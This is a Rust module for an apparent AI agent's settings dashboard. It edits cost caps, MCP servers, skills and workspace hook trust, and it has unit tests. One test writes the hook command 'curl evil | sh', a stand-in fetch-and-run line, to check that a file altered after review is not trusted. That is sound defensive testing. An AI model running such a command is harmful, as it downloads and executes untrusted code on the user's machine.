//! Reading and changing the settings the dashboard edits (M24,
//! docs/m24-dashboard-2.md §3): the caps, MCP servers, skills and the
//! workspace's hooks trust. The one API the page, the CLI and the Telegram
//! door call, in the shape of M21's models API: a read model, and
//! operations that edit the config under its lock (comments kept), are
//! refused when the result wouldn't parse or validate, are audited, and
//! answer `{said, view}`. The owner check stays with the caller; `by` is
//! only a label for the audit.
//!
//! Tasks' schedule and model are in `tasks_admin`, with the other task
//! operations.

use crate::config::Config;
use crate::setup::{put, table};
use crate::tasks_admin::edit_config;
use anyhow::{anyhow, bail, Result};
use ferrule_trust::{Hub, TrustConfig};
use serde::Serialize;
use serde_json::json;
use std::path::{Path, PathBuf};
use std::sync::Arc;

/// The caps the page, `ferrule trust caps` and `/caps` can set, in the
/// order they're shown. `_usd_` ones are dollars, the others tokens.
pub const CAP_KEYS: [&str; 6] = [
    "max_usd_per_run",
    "max_tokens_per_run",
    "max_usd_per_day",
    "max_tokens_per_day",
    "max_usd_per_task",
    "max_tokens_per_task",
];

/// Everything the settings show, as it is now.
#[derive(Debug, Clone, Serialize)]
pub struct SettingsView {
    pub caps: Vec<CapRow>,
    pub warn_at: f64,
    pub mcp: Vec<McpRow>,
    pub skills_enabled: bool,
    pub skills: Vec<SkillRow>,
    /// `[skills] disabled`, as written.
    pub skills_disabled: Vec<String>,
    /// `[hooks]` in the config: trusted with the config itself.
    pub hooks: Vec<HookRow>,
    /// The workspace's `.ferrule/hooks.toml`, which runs only once trusted.
    pub workspace_hooks: Option<WorkspaceHooksView>,
}

#[derive(Debug, Clone, Serialize)]
pub struct CapRow {
    pub key: &'static str,
    /// `usd` or `tokens`.
    pub unit: &'static str,
    /// 0: off.
    pub value: f64,
}

#[derive(Debug, Clone, Serialize)]
pub struct McpRow {
    pub name: String,
    /// The command's file name, or the URL's host: never args, env,
    /// headers or a URL path.
    pub runs: String,
    /// `configured` (`[[mcp.servers]]`) or `installed` (by the agent, M13).
    pub origin: &'static str,
    pub disabled: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct SkillRow {
    pub name: String,
    pub description: String,
    pub scope: String,
    pub disabled: bool,
    /// Its `triggers:` (M28).
    pub triggers: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct HookRow {
    pub event: String,
    pub matcher: Option<String>,
    pub command: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct WorkspaceHooksView {
    pub file: String,
    /// The file as it is now (the page redacts it like every answer).
    pub text: String,
    /// SHA-256 of the file as it is now: what a trust request must carry.
    pub sha: String,
    /// The hash it's trusted at, if any.
    pub trusted_sha: Option<String>,
    pub trusted: bool,
    pub hooks: Vec<HookRow>,
    /// Why it can't be trusted as it is.
    pub parse_error: Option<String>,
    /// Lines against the copy kept when it was last trusted here; `None`
    /// when there's no copy or nothing changed.
    pub diff: Option<Vec<DiffLine>>,
    /// `[hooks] project`: without it, trusted hooks still don't run.
    pub project: bool,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct DiffLine {
    /// `+`, `-` or ` `.
    pub op: char,
    pub line: String,
}

/// What a change did: a sentence for the owner, and the view after it.
#[derive(Debug, Clone, Serialize)]
pub struct Done {
    pub said: String,
    pub view: SettingsView,
}

pub struct Settings {
    path: PathBuf,
    data: Option<PathBuf>,
    hub: Option<Arc<Hub>>,
    workspace: Option<PathBuf>,
}

impl Settings {
    /// `path`: the config; `data`: the data dir (hooks trust); `hub`: the
    /// process's, whose caps change at once and where changes are audited;
    /// `workspace`: whose `.ferrule/hooks.toml` is shown.
    pub fn new(
        path: PathBuf,
        data: Option<PathBuf>,
        hub: Option<Arc<Hub>>,
        workspace: Option<PathBuf>,
    ) -> Self {
        Self {
            path,
            data,
            hub,
            workspace,
        }
    }

    /// This machine's settings, for the CLI.
    pub fn open(workspace: Option<PathBuf>) -> Result<Self> {
        let (cfg, path) = Config::load()?;
        Ok(Self::new(
            path,
            crate::config::data_dir().ok(),
            crate::trust::hub(&cfg).ok(),
            workspace,
        ))
    }

    fn config(&self) -> Result<Config> {
        let text = match std::fs::read_to_string(&self.path) {
            Ok(t) => t,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
            Err(e) => bail!("reading {}: {e}", self.path.display()),
        };
        let cfg: Config = toml::from_str(&text)
            .map_err(|e| anyhow!("{} doesn't parse: {e}", self.path.display()))?;
        cfg.finish()
    }

    fn audit(&self, event: &str, detail: serde_json::Value) {
        if let Some(hub) = &self.hub {
            hub.audit()
                .record(chrono::Utc::now(), event, None, None, detail);
        }
    }

    fn done(&self, said: String) -> Result<Done> {
        Ok(Done {
            said,
            view: self.view()?,
        })
    }

    pub fn view(&self) -> Result<SettingsView> {
        let cfg = self.config()?;
        let caps = CAP_KEYS
            .iter()
            .map(|&key| CapRow {
                key,
                unit: unit(key),
                value: cap(&cfg.trust, key),
            })
            .collect();
        let mut mcp: Vec<McpRow> = cfg
            .mcp
            .servers
            .iter()
            .map(|s| McpRow {
                name: s.name.clone(),
                runs: runs(s.url.as_deref(), &s.command),
                origin: "configured",
                disabled: cfg.mcp.disabled.contains(&s.name),
            })
            .collect();
        for (name, s) in self.installed() {
            mcp.push(McpRow {
                runs: runs(s.url.as_deref(), &s.command),
                name,
                origin: "installed",
                disabled: false,
            });
        }
        let skills = self
            .skills(&cfg)
            .into_iter()
            .map(|s| SkillRow {
                disabled: cfg.skills.disabled.contains(&s.name),
                description: clip(&s.description, 160),
                scope: format!("{:?}", s.scope).to_lowercase(),
                triggers: s.triggers,
                name: s.name,
            })
            .collect();
        let hooks = cfg
            .hooks
            .entries()
            .iter()
            .map(|(event, h)| HookRow {
                event: event.name().to_string(),
                matcher: h.matcher.clone(),
                command: clip(&h.command, 80),
            })
            .collect();
        Ok(SettingsView {
            caps,
            warn_at: cfg.trust.warn_at,
            mcp,
            skills_enabled: cfg.skills.enabled,
            skills,
            skills_disabled: cfg.skills.disabled.clone(),
            hooks,
            workspace_hooks: self.workspace_hooks(cfg.hooks.project),
        })
    }

    /// Every skill found, disabled ones included (so they can be turned
    /// back on).
    fn skills(&self, cfg: &Config) -> Vec<ferrule_skills::Skill> {
        if !cfg.skills.enabled {
            return Vec::new();
        }
        let all = crate::config::SkillsConfig {
            disabled: Vec::new(),
            ..cfg.skills.clone()
        };
        let ws = self.workspace.clone().unwrap_or_default();
        crate::discover_skills(&all, &ws).skills
    }

    /// The servers the agent installed (M13), from their lock file.
    fn installed(&self) -> Vec<(String, ferrule_extensions::lock::ServerEntry)> {
        let Some(data) = &self.data else {
            return Vec::new();
        };
        let lock = ferrule_extensions::Layout::new(data.clone()).lock_path();
        if !lock.exists() {
            return Vec::new();
        }
        ferrule_extensions::LockStore::new(lock)
            .load()
            .map(|l| l.servers.into_iter().collect())
            .unwrap_or_default()
    }

    // ---- Caps -------------------------------------------------------------

    /// The question to ask before `changes`, or `None` when they're safe:
    /// lowering a cap, or turning an unset one on, needs none; raising one
    /// or turning one off (0) is a money decision.
    pub fn caps_question(&self, changes: &[(String, f64)]) -> Result<Option<String>> {
        let cfg = self.config()?;
        let mut riskier = Vec::new();
        for (key, new) in changes {
            let key = cap_key(key)?;
            let old = cap(&cfg.trust, key);
            if old > 0.0 && (*new == 0.0 || *new > old) {
                riskier.push(format!(
                    "{key} from {} to {}",
                    show(key, old),
                    show(key, *new)
                ));
            }
        }
        Ok((!riskier.is_empty()).then(|| {
            format!(
                "Raise {}? That lets unattended runs spend more.",
                riskier.join(", ")
            )
        }))
    }

    /// Write `changes` to `[trust]` and make them the process's caps at
    /// once. The caller has asked `caps_question` first.
    pub fn set_caps(&self, changes: &[(String, f64)], by: &str) -> Result<Done> {
        if changes.is_empty() {
            bail!("no cap to change");
        }
        // The full key from here on, however it was typed.
        let changes: Vec<(&'static str, f64)> = changes
            .iter()
            .map(|(k, v)| cap_key(k).map(|k| (k, *v)))
            .collect::<Result<_>>()?;
        let changes = &changes;
        for &(key, ref value) in changes {
            if !value.is_finite() || *value < 0.0 {
                bail!("{key} must be 0 (off) or more, not {value}");
            }
            if unit(key) == "tokens" && value.fract() != 0.0 {
                bail!("{key} is a whole number of tokens, not {value}");
            }
        }
        let (from, to) = edit_config(&self.path, |t| {
            let before = t.config()?.trust;
            let trust = table(t.root(), &["trust"])?;
            for &(key, value) in changes {
                if unit(key) == "tokens" {
                    put(trust, key, value as i64);
                } else {
                    put(trust, key, value);
                }
            }
            let after = t
                .config()
                .map_err(|e| anyhow!("that change would break the config: {e}"))?
                .trust;
            after.validate().map_err(|e| anyhow!("[trust]: {e}"))?;
            Ok((before, after))
        })?;
        if let Some(hub) = &self.hub {
            hub.set_caps(&to).map_err(|e| anyhow!("[trust]: {e}"))?;
        }
        let said: Vec<String> = changes
            .iter()
            .map(|(key, _)| {
                format!(
                    "{key} {} → {}",
                    show(key, cap(&from, key)),
                    show(key, cap(&to, key))
                )
            })
            .collect();
        self.audit(
            "settings.caps",
            json!({
                "changes": changes.iter().map(|(k, _)| json!({
                    "key": k, "from": cap(&from, k), "to": cap(&to, k),
                })).collect::<Vec<_>>(),
                "by": by,
            }),
        );
        self.done(format!("Caps: {}.", said.join(", ")))
    }

    // ---- MCP --------------------------------------------------------------

    /// Turn a configured server off or back on (`[mcp] disabled`). The
    /// config follower stops or starts it within seconds.
    pub fn mcp_set_disabled(&self, name: &str, disabled: bool, by: &str) -> Result<Done> {
        let changed = edit_config(&self.path, |t| {
            let cfg = t.config()?;
            if !cfg.mcp.servers.iter().any(|s| s.name == name) {
                if self.installed().iter().any(|(n, _)| n == name) {
                    bail!("`{name}` was installed by the agent; it can be removed, not disabled");
                }
                bail!("no configured MCP server `{name}`");
            }
            let list = with_or_without(&cfg.mcp.disabled, name, disabled);
            let changed = list != cfg.mcp.disabled;
            if changed {
                put(table(t.root(), &["mcp"])?, "disabled", array(&list));
            }
            Ok(changed)
        })?;
        let action = if disabled { "disable" } else { "enable" };
        if changed {
            self.audit(
                "settings.mcp",
                json!({ "server": name, "action": action, "by": by }),
            );
        }
        self.done(match (disabled, changed) {
            (true, true) => format!("`{name}` is off; running agents stop it within seconds."),
            (false, true) => format!("`{name}` is on; running agents start it within seconds."),
            (true, false) => format!("`{name}` was off already."),
            (false, false) => format!("`{name}` was on already."),
        })
    }

    /// Remove a server: a configured one from the config (its `[secrets]`
    /// stay), an installed one through the extension manager, as `ferrule
    /// mcp remove` does. The caller has confirmed.
    pub async fn mcp_remove(&self, name: &str, by: &str) -> Result<Done> {
        let configured = self.config()?.mcp.servers.iter().any(|s| s.name == name);
        let mut said = format!("Removed `{name}`; running agents stop it within seconds.");
        if configured {
            let removed = {
                let _lock = crate::filewrite::Lock::take(&self.path)?;
                crate::mcp_config::remove_configured(self.path.clone(), name, false)?
            };
            let Some(removed) = removed else {
                bail!("no MCP server `{name}`");
            };
            // It's gone, so it's no longer disabled either.
            edit_config(&self.path, |t| {
                let cfg = t.config()?;
                if cfg.mcp.disabled.iter().any(|n| n == name) {
                    let list = with_or_without(&cfg.mcp.disabled, name, false);
                    put(table(t.root(), &["mcp"])?, "disabled", array(&list));
                }
                Ok(())
            })?;
            if !removed.secrets_kept.is_empty() {
                said.push_str(&format!(
                    " Its secrets stay: {}.",
                    removed.secrets_kept.join(", ")
                ));
            }
        } else if self.installed().iter().any(|(n, _)| n == name) {
            let ws = self.workspace.clone().unwrap_or_else(|| PathBuf::from("."));
            let m = crate::self_extend::owner_manager(&ws)?;
            m.remove_server(name, true, false).await?;
        } else {
            bail!("no MCP server `{name}`");
        }
        self.audit(
            "settings.mcp",
            json!({ "server": name, "action": "remove", "by": by }),
        );
        self.done(said)
    }

    // ---- Skills -----------------------------------------------------------

    /// Turn a skill off or back on (`[skills] disabled`), for every agent
    /// from its next turn.
    pub fn skill_set_disabled(&self, name: &str, disabled: bool, by: &str) -> Result<Done> {
        let changed = edit_config(&self.path, |t| {
            let cfg = t.config()?;
            let known = cfg.skills.disabled.iter().any(|n| n == name)
                || self.skills(&cfg).iter().any(|s| s.name == name);
            if !known {
                bail!("no skill `{name}` (`ferrule skills` lists them)");
            }
            let list = with_or_without(&cfg.skills.disabled, name, disabled);
            let changed = list != cfg.skills.disabled;
            if changed {
                put(table(t.root(), &["skills"])?, "disabled", array(&list));
            }
            Ok(changed.then_some(list))
        })?;
        // This process's agents at once; others at their follower's next look.
        if let (Some(list), Some(live)) = (&changed, crate::self_extend::live_skills()) {
            live.set_disabled(list.clone());
        }
        let changed = changed.is_some();
        if changed {
            self.audit(
                "settings.skill",
                json!({
                    "skill": name,
                    "action": if disabled { "disable" } else { "enable" },
                    "by": by,
                }),
            );
        }
        self.done(match (disabled, changed) {
            (true, true) => format!("Skill `{name}` is off from the next turn."),
            (false, true) => format!("Skill `{name}` is on from the next turn."),
            (true, false) => format!("Skill `{name}` was off already."),
            (false, false) => format!("Skill `{name}` was on already."),
        })
    }

    // ---- Hooks ------------------------------------------------------------

    fn trust_store(&self) -> Result<ferrule_hooks::TrustStore> {
        let data = self
            .data
            .as_ref()
            .ok_or_else(|| anyhow!("no data directory here"))?;
        Ok(ferrule_hooks::TrustStore::in_data_dir(data))
    }

    fn kept_dir(&self) -> Option<PathBuf> {
        Some(self.data.as_ref()?.join("private").join("hooks-trusted"))
    }

    fn workspace(&self) -> Result<PathBuf> {
        let ws = self
            .workspace
            .as_ref()
            .ok_or_else(|| anyhow!("no workspace here"))?;
        dunce::canonicalize(ws).map_err(|e| anyhow!("workspace {}: {e}", ws.display()))
    }

    fn workspace_hooks(&self, project: bool) -> Option<WorkspaceHooksView> {
        let ws = self.workspace().ok()?;
        let file = ferrule_hooks::trust::workspace_file(&ws);
        let bytes = std::fs::read(&file).ok()?;
        let text = String::from_utf8_lossy(&bytes).into_owned();
        let sha = ferrule_hooks::trust::fingerprint(&bytes);
        let trusted_sha = self.trust_store().ok().and_then(|s| s.trusted(&ws));
        let (hooks, parse_error) = match ferrule_hooks::WorkspaceHooks::parse(&text) {
            Ok(h) => (
                h.entries()
                    .iter()
                    .map(|(event, e)| HookRow {
                        event: event.name().to_string(),
                        matcher: e.matcher.clone(),
                        command: clip(&e.command, 200),
                    })
                    .collect(),
                None,
            ),
            Err(e) => (Vec::new(), Some(e.to_string())),
        };
        let diff = match (&trusted_sha, self.kept_dir()) {
            (Some(t), Some(dir)) if *t != sha => {
                std::fs::read_to_string(dir.join(format!("{t}.toml")))
                    .ok()
                    .map(|old| line_diff(&old, &text))
            }
            _ => None,
        };
        Some(WorkspaceHooksView {
            file: file.display().to_string(),
            trusted: trusted_sha.as_deref() == Some(sha.as_str()),
            text,
            sha,
            trusted_sha,
            hooks,
            parse_error,
            diff,
            project,
        })
    }

    /// Trust the workspace's hooks file, as long as it's still the one
    /// whose hash (`sha_seen`) the owner was shown. It's compared before,
    /// and the pinned hash read back after; either differs and nothing is
    /// trusted. The caller has confirmed.
    pub fn hooks_trust(&self, sha_seen: &str, by: &str) -> Result<Done> {
        let ws = self.workspace()?;
        let file = ferrule_hooks::trust::workspace_file(&ws);
        let bytes =
            std::fs::read(&file).map_err(|e| anyhow!("can't read {}: {e}", file.display()))?;
        let changed = || {
            anyhow!(
                "{} changed while you were reading it; not trusted",
                file.display()
            )
        };
        let sha = ferrule_hooks::trust::fingerprint(&bytes);
        if !sha.eq_ignore_ascii_case(sha_seen.trim()) {
            bail!(changed());
        }
        let store = self.trust_store()?;
        let n = store.trust(&ws).map_err(|e| anyhow!(e))?;
        if store.trusted(&ws).as_deref() != Some(sha.as_str()) {
            store.untrust(&ws).map_err(|e| anyhow!(e))?;
            bail!(changed());
        }
        // The text as trusted, for the next change's diff.
        if let Some(dir) = self.kept_dir() {
            let kept = crate::secrets::create_private_dir(&dir).and_then(|()| {
                crate::secrets::write_private(
                    &dir.join(format!("{sha}.toml")),
                    &String::from_utf8_lossy(&bytes),
                )
            });
            if let Err(e) = kept {
                tracing::warn!("keeping the trusted hooks file for later diffs: {e:#}");
            }
        }
        self.audit(
            "hooks.trust",
            json!({ "workspace": ws.display().to_string(), "sha256": sha, "hooks": n, "by": by }),
        );
        let mut said = format!(
            "Trusted {n} hook{} in {}; editing the file needs trusting it again.",
            if n == 1 { "" } else { "s" },
            file.display()
        );
        if !self.config()?.hooks.project {
            said.push_str(" They won't run until `[hooks] project = true` is in the config.");
        }
        self.done(said)
    }

    pub fn hooks_untrust(&self, by: &str) -> Result<Done> {
        let ws = self.workspace()?;
        let was = self.trust_store()?.untrust(&ws).map_err(|e| anyhow!(e))?;
        if was {
            self.audit(
                "hooks.untrust",
                json!({ "workspace": ws.display().to_string(), "by": by }),
            );
        }
        self.done(if was {
            format!("{}'s hooks won't run any more.", ws.display())
        } else {
            format!("{} wasn't trusted.", ws.display())
        })
    }
}

fn unit(key: &str) -> &'static str {
    if key.contains("_usd_") {
        "usd"
    } else {
        "tokens"
    }
}

/// `key`, if it's one of [`CAP_KEYS`] (also without its `max_`).
pub fn cap_key(key: &str) -> Result<&'static str> {
    let key = key.trim();
    CAP_KEYS
        .iter()
        .find(|k| **k == key || k.strip_prefix("max_") == Some(key))
        .copied()
        .ok_or_else(|| anyhow!("no cap `{key}`; the caps are {}", CAP_KEYS.join(", ")))
}

fn cap(t: &TrustConfig, key: &str) -> f64 {
    match key {
        "max_usd_per_run" => t.max_usd_per_run,
        "max_tokens_per_run" => t.max_tokens_per_run as f64,
        "max_usd_per_day" => t.max_usd_per_day,
        "max_tokens_per_day" => t.max_tokens_per_day as f64,
        "max_usd_per_task" => t.max_usd_per_task,
        "max_tokens_per_task" => t.max_tokens_per_task as f64,
        _ => 0.0,
    }
}

/// A cap as the owner reads it: "$5.00", "5000000 tokens", "off".
pub fn show(key: &str, v: f64) -> String {
    if v == 0.0 {
        "off".into()
    } else if unit(key) == "usd" {
        format!("${v:.2}")
    } else {
        format!("{} tokens", v as u64)
    }
}

fn runs(url: Option<&str>, command: &str) -> String {
    match url {
        Some(u) => format!("{} (remote)", crate::dashboard::api::url_host(u)),
        None => Path::new(command)
            .file_name()
            .map(|f| f.to_string_lossy().into_owned())
            .unwrap_or_default(),
    }
}

fn clip(s: &str, max: usize) -> String {
    match s.char_indices().nth(max) {
        Some((i, _)) => format!("{}…", &s[..i]),
        None => s.to_string(),
    }
}

fn with_or_without(list: &[String], name: &str, with: bool) -> Vec<String> {
    let mut out: Vec<String> = list.iter().filter(|n| *n != name).cloned().collect();
    if with {
        out.push(name.to_string());
    }
    out
}

fn array(list: &[String]) -> toml_edit::Value {
    toml_edit::Value::Array(list.iter().map(String::as_str).collect())
}

/// Longest files it diffs, in lines; longer ones show no diff.
const DIFF_LINES: usize = 400;

/// A line diff of `old` against `new` (a longest common subsequence),
/// only when both are short.
pub fn line_diff(old: &str, new: &str) -> Vec<DiffLine> {
    let a: Vec<&str> = old.lines().collect();
    let b: Vec<&str> = new.lines().collect();
    if a.len() > DIFF_LINES || b.len() > DIFF_LINES {
        return vec![DiffLine {
            op: ' ',
            line: format!(
                "(too long to compare here: {} → {} lines)",
                a.len(),
                b.len()
            ),
        }];
    }
    let mut lcs = vec![vec![0u16; b.len() + 1]; a.len() + 1];
    for i in (0..a.len()).rev() {
        for j in (0..b.len()).rev() {
            lcs[i][j] = if a[i] == b[j] {
                lcs[i + 1][j + 1] + 1
            } else {
                lcs[i + 1][j].max(lcs[i][j + 1])
            };
        }
    }
    let (mut i, mut j, mut out) = (0, 0, Vec::new());
    let line = |op, l: &str| DiffLine {
        op,
        line: l.to_string(),
    };
    while i < a.len() || j < b.len() {
        if i < a.len() && j < b.len() && a[i] == b[j] {
            out.push(line(' ', a[i]));
            i += 1;
            j += 1;
        } else if j < b.len() && (i == a.len() || lcs[i][j + 1] >= lcs[i + 1][j]) {
            out.push(line('+', b[j]));
            j += 1;
        } else {
            out.push(line('-', a[i]));
            i += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn setup(config: &str) -> (tempfile::TempDir, Settings, Arc<Hub>) {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("ferrule.toml");
        std::fs::write(&path, config).unwrap();
        let data = dir.path().join("data");
        std::fs::create_dir_all(&data).unwrap();
        let ws = dir.path().join("ws");
        std::fs::create_dir_all(&ws).unwrap();
        let cfg: Config = toml::from_str(config).unwrap();
        let hub = Arc::new(
            Hub::new(
                cfg.trust.clone(),
                &data,
                &data.join("ledger.jsonl"),
                Arc::new(ferrule_trust::SystemClock),
                vec![],
            )
            .unwrap(),
        );
        let s = Settings::new(path, Some(data), Some(hub.clone()), Some(ws));
        (dir, s, hub)
    }

    fn audited(hub: &Hub, event: &str) -> Vec<serde_json::Value> {
        hub.audit()
            .read(None)
            .unwrap()
            .into_iter()
            .filter(|e| e.event == event)
            .map(|e| e.detail)
            .collect()
    }

    #[test]
    fn raising_a_cap_asks_and_lowering_one_does_not() {
        let (_d, s, _) = setup("[trust]\nmax_usd_per_day = 10.0\n");
        let ask = |k: &str, v: f64| s.caps_question(&[(k.to_string(), v)]).unwrap();
        assert!(ask("max_usd_per_day", 20.0)
            .unwrap()
            .contains("$10.00 to $20.00"));
        assert!(ask("usd_per_day", 0.0).unwrap().contains("to off"));
        assert_eq!(ask("max_usd_per_day", 5.0), None);
        // Unset per-task caps are off; turning one on lowers what can be spent.
        assert_eq!(ask("max_usd_per_task", 3.0), None);
        assert!(s.caps_question(&[("nope".into(), 1.0)]).is_err());
    }

    #[test]
    fn caps_are_written_keeping_comments_live_in_the_hub_and_audited() {
        let (d, s, hub) = setup("# mine\n[trust]\nmax_usd_per_day = 10.0 # daily\n");
        let done = s
            .set_caps(
                &[
                    ("max_usd_per_day".into(), 4.5),
                    ("max_tokens_per_task".into(), 1000.0),
                ],
                "test",
            )
            .unwrap();
        assert!(done.said.contains("$10.00 → $4.50"), "{}", done.said);
        let text = std::fs::read_to_string(d.path().join("ferrule.toml")).unwrap();
        assert!(
            text.contains("# mine") && text.contains("# daily"),
            "{text}"
        );
        assert!(text.contains("max_tokens_per_task = 1000"), "{text}");
        assert_eq!(hub.config().max_usd_per_day, 4.5);
        assert_eq!(hub.config().max_tokens_per_task, 1000);
        let row = done.view.caps.iter().find(|c| c.key == "max_usd_per_day");
        assert_eq!(row.unwrap().value, 4.5);
        let a = audited(&hub, "settings.caps");
        assert_eq!(a.len(), 1);
        assert_eq!(a[0]["by"], "test");
        assert_eq!(a[0]["changes"][0]["from"], 10.0);
    }

    #[test]
    fn a_bad_cap_is_refused_and_nothing_is_written() {
        let (d, s, hub) = setup("[trust]\nmax_usd_per_day = 10.0\n");
        let before = std::fs::read_to_string(d.path().join("ferrule.toml")).unwrap();
        assert!(s
            .set_caps(&[("max_usd_per_day".into(), -1.0)], "t")
            .is_err());
        assert!(s
            .set_caps(&[("max_tokens_per_day".into(), 1.5)], "t")
            .is_err());
        assert!(s
            .set_caps(&[("max_usd_per_day".into(), f64::NAN)], "t")
            .is_err());
        assert_eq!(
            std::fs::read_to_string(d.path().join("ferrule.toml")).unwrap(),
            before
        );
        assert_eq!(hub.config().max_usd_per_day, 10.0);
        assert!(audited(&hub, "settings.caps").is_empty());
    }

    const TWO_SERVERS: &str = r#"
[[mcp.servers]]
name = "local"
command = "/usr/bin/some-mcp"

[[mcp.servers]]
name = "remote"
url = "https://mcp.example.com/secret/path"
"#;

    #[test]
    fn mcp_disable_and_enable_edit_the_list_and_are_audited() {
        let (d, s, hub) = setup(TWO_SERVERS);
        let done = s.mcp_set_disabled("local", true, "test").unwrap();
        assert!(done
            .view
            .mcp
            .iter()
            .any(|m| m.name == "local" && m.disabled));
        let cfg: Config =
            toml::from_str(&std::fs::read_to_string(d.path().join("ferrule.toml")).unwrap())
                .unwrap();
        assert_eq!(cfg.mcp.disabled, ["local"]);
        assert!(!crate::mcp_servers(&cfg).iter().any(|m| m.name == "local"));
        // Again: nothing changes, nothing more is audited.
        s.mcp_set_disabled("local", true, "test").unwrap();
        let done = s.mcp_set_disabled("local", false, "test").unwrap();
        assert!(done.view.mcp.iter().all(|m| !m.disabled));
        let a = audited(&hub, "settings.mcp");
        assert_eq!(a.len(), 2, "{a:?}");
        assert_eq!(a[1]["action"], "enable");
        assert!(s.mcp_set_disabled("nope", true, "t").is_err());
        let text = serde_json::to_string(&s.view().unwrap()).unwrap();
        assert!(!text.contains("secret/path"), "{text}");
    }

    #[tokio::test]
    async fn mcp_remove_takes_it_out_of_the_config_and_the_disabled_list() {
        let (d, s, hub) = setup(TWO_SERVERS);
        s.mcp_set_disabled("remote", true, "t").unwrap();
        let done = s.mcp_remove("remote", "test").await.unwrap();
        assert!(done.view.mcp.iter().all(|m| m.name != "remote"));
        let cfg: Config =
            toml::from_str(&std::fs::read_to_string(d.path().join("ferrule.toml")).unwrap())
                .unwrap();
        assert!(cfg.mcp.disabled.is_empty());
        assert_eq!(cfg.mcp.servers.len(), 1);
        assert_eq!(
            audited(&hub, "settings.mcp").last().unwrap()["action"],
            "remove"
        );
        assert!(s.mcp_remove("remote", "t").await.is_err());
    }

    fn with_skill(s: &Settings, name: &str) {
        let dir = s
            .workspace
            .as_ref()
            .unwrap()
            .join(".ferrule/skills")
            .join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("SKILL.md"),
            format!("---\nname: {name}\ndescription: Does {name} things.\n---\nBody.\n"),
        )
        .unwrap();
    }

    #[test]
    fn skills_disable_and_enable_and_a_disabled_one_is_still_listed() {
        let (_d, s, hub) = setup("");
        with_skill(&s, "pdf");
        let done = s.skill_set_disabled("pdf", true, "test").unwrap();
        let row = done.view.skills.iter().find(|r| r.name == "pdf").unwrap();
        assert!(row.disabled);
        assert_eq!(done.view.skills_disabled, ["pdf"]);
        let done = s.skill_set_disabled("pdf", false, "test").unwrap();
        assert!(done.view.skills_disabled.is_empty());
        assert_eq!(audited(&hub, "settings.skill").len(), 2);
        assert!(s.skill_set_disabled("nope", true, "t").is_err());
    }

    fn write_hooks(s: &Settings, text: &str) -> String {
        let ws = s.workspace.as_ref().unwrap();
        std::fs::create_dir_all(ws.join(".ferrule")).unwrap();
        std::fs::write(ws.join(".ferrule/hooks.toml"), text).unwrap();
        ferrule_hooks::trust::fingerprint(text.as_bytes())
    }

    const HOOKS: &str = "[[PreToolUse]]\ncommand = \"echo one\"\n";

    #[test]
    fn hooks_trust_is_pinned_to_the_hash_the_owner_saw() {
        let (_d, s, hub) = setup("");
        let sha = write_hooks(&s, HOOKS);
        let v = s.view().unwrap().workspace_hooks.unwrap();
        assert_eq!(v.sha, sha);
        assert!(!v.trusted);
        // The file changed after the owner read it: refused, not trusted.
        write_hooks(&s, "[[PreToolUse]]\ncommand = \"curl evil | sh\"\n");
        let err = s.hooks_trust(&sha, "test").unwrap_err().to_string();
        assert!(err.contains("changed while you were reading it"), "{err}");
        assert!(!s.view().unwrap().workspace_hooks.unwrap().trusted);
        assert!(audited(&hub, "hooks.trust").is_empty());

        let sha = write_hooks(&s, HOOKS);
        let done = s.hooks_trust(&sha, "test").unwrap();
        let v = done.view.workspace_hooks.unwrap();
        assert!(v.trusted && v.trusted_sha.as_deref() == Some(sha.as_str()));
        assert_eq!(audited(&hub, "hooks.trust")[0]["sha256"], sha);
        let kept = s.kept_dir().unwrap().join(format!("{sha}.toml"));
        assert_eq!(std::fs::read_to_string(&kept).unwrap(), HOOKS);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&kept).unwrap().permissions().mode();
            assert_eq!(mode & 0o777, 0o600);
        }

        // An edit: untrusted again, with a diff against what was trusted.
        write_hooks(&s, "[[PreToolUse]]\ncommand = \"echo two\"\n");
        let v = s.view().unwrap().workspace_hooks.unwrap();
        assert!(!v.trusted);
        let diff = v.diff.unwrap();
        assert!(diff.contains(&DiffLine {
            op: '-',
            line: "command = \"echo one\"".into()
        }));
        assert!(diff.contains(&DiffLine {
            op: '+',
            line: "command = \"echo two\"".into()
        }));

        let done = s.hooks_untrust("test").unwrap();
        assert!(done.view.workspace_hooks.unwrap().trusted_sha.is_none());
        assert_eq!(audited(&hub, "hooks.untrust").len(), 1);
    }

    #[test]
    fn line_diff_marks_what_changed() {
        let d = line_diff("a\nb\nc\n", "a\nc\nd\n");
        let ops: String = d.iter().map(|l| l.op).collect();
        assert_eq!(ops, " - +");
    }
}
